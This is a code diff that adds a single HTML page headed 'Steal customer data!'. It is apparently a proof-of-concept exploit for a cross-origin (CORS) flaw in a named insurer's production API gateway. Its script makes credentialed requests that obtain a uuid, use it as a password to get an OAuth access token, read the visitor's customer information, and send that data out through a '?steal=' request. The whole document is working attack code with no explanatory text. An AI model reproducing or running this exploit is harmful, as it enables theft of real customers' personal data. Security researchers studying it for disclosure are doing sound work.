@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h3>Steal customer data!</h3>
+
+<div id="demo">
+</div>
+
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var parse = JSON.parse(this.response);
+    window.uid = parse.cel_uuid;  
+    setTimeout(cors2, 500);
+    }
+  };
+  xhttp.open("GET", "https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/preOAuth", true);
+  xhttp.withCredentials = true;
+  xhttp.setRequestHeader("X-IBM-Client-Id", "84214774-3012-4b7f-a7a5-278188a90c9e");
+  xhttp.send();
+}
+
+function cors2()
+{
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var parse = JSON.parse(this.response);
+    window.token2 = parse.access_token;
+    setTimeout(cors3, 500);
+    }
+  };
+  xhttp.open("POST", "https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/oauth/oauth2/token", true);
+  xhttp.withCredentials = true;
+  xhttp.setRequestHeader("X-IBM-Client-Id", "84214774-3012-4b7f-a7a5-278188a90c9e");
+  xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+  var params = "grant_type=password&client_id=84214774-3012-4b7f-a7a5-278188a90c9e&username=mfnol&password="+uid+"&scope=scope1";
+  xhttp.send(params);
+}
+
+function cors3()
+{
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    document.getElementById("demo").innerHTML = alert(this.responseText);
+    window.response = this.responseText;
+    setTimeout(cors4, 500);
+    }
+  };
+  xhttp.open("GET", "https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/customerInformation", true);
+  xhttp.withCredentials = true;
+  xhttp.setRequestHeader("X-IBM-Client-Id", "84214774-3012-4b7f-a7a5-278188a90c9e");
+  xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+  xhttp.setRequestHeader("Authorization", "Bearer "+token2);
+  xhttp.send();
+}
+function cors4()
+{
+var xhttp = new XMLHttpRequest();
+xhttp.open("GET", "http://localhost/?steal="+encodeURI(response), true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+cors()
+</script>
+
+</body>
+</html>
